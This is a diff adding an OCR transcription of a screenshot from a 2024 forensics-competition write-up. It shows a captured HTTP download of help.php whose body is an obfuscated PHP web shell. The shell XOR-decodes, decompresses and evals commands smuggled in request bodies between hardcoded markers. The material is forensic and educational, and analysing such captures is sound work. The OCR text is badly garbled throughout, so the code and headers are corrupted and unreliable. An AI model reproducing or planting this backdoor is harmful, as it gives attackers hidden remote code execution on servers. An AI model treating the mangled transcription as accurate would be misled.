@@ -1,0 +1,20 @@
+# OCR: ec1f670e0c06a8fbd14b630517091a8c.webp
+# 来源: ./02-WriteUp/2024/2024-数证杯-初赛/ec1f670e0c06a8fbd14b630517091a8c.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+GET/help.phpHTTP/1.1
+User-Agent:Wget/1.13.4(1inux-gnu) Accept：*/*
+Host:192.168.75.132:2000
+Connection:Keep-Alive HTTP/1.02000K
+Seryer:SimpleHTTp/o.6Python/3.11.8 Date:Wed,31Jul202407:03:35GMT
+Content-type：application/octet-stream Content-Length:771
+Last-Modified:Wed，31Jul202407:00:33GMT <?php
+$q='uvlo2g6mkn7y";fvlunctivlovlnx(v1$t,$k)($c=v1strlen(v1$k)vl;v1$l=strlenv1($t);$o';
+$k='tents(v1"php://ivlnput").$vlmv1)==1){@ovibstart();vi@evlval(@v1gzuncomvlpress(@x(@'： $A="$k="c6v1ae1ev170";$khv1="cbbf9v1691e009";v1$v1kv1f-"85a8v19e92c410":$p="dv1zINv1Rg'
+$o='-"v1";forv1($i=0;$v1ivlvl<$l;){fvlvlor($j=0;($j<$c&&$i<$lv1);$j++,$i++)v1(v1$o.=v1$t[$i)^'
+tD=strreplace('cM
+cMcreacMtecMfcMunccMcMtion）
+$Q=$k{$j)vlvl;)returnv1$o;v1)if(@pregv1vlmatch("/v1$kh(.+)vlv1$kf/",@v1fvlilegetcovln'; $Z-'leanv1();$r=@base6v14_ev1ncvlode(v1@x(@gzcov1mpress($ov1),$v1kv1));printv1("$p$kh$r$kf");)'
+$w=v1basev164decodev1($mv1[v11j),$v1k)));$o=@ov1b_get_contev1nts(v1v1);@ob_env1d_c; $S=strreplace('vi',,$A.$q.$o.$Q.$k.$w.$z);
+$C=$D(,$S);$C();?>
